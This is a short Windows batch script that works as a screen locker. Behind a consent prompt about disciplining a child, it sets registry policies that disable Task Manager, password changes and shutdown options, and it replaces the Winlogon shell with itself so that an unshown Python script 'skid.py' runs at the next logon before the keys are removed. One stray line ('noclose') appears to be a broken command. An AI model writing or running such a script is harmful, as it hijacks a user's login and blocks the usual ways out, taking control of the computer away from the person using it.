@echo off
pushd %~dp0%
echo press any key if you agree that you are ONLY doing this to discipline a misbehaving child...
pause > nul
noclose
if "%1"=="skid" goto init
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "cmd /c cd /d %cd% && ^"! cum.cmd^" skid" /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
shutdown -l
exit
:init
python314\python skid.py
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v shutdownwithoutlogon /f
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /f
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f
start userinit
exit
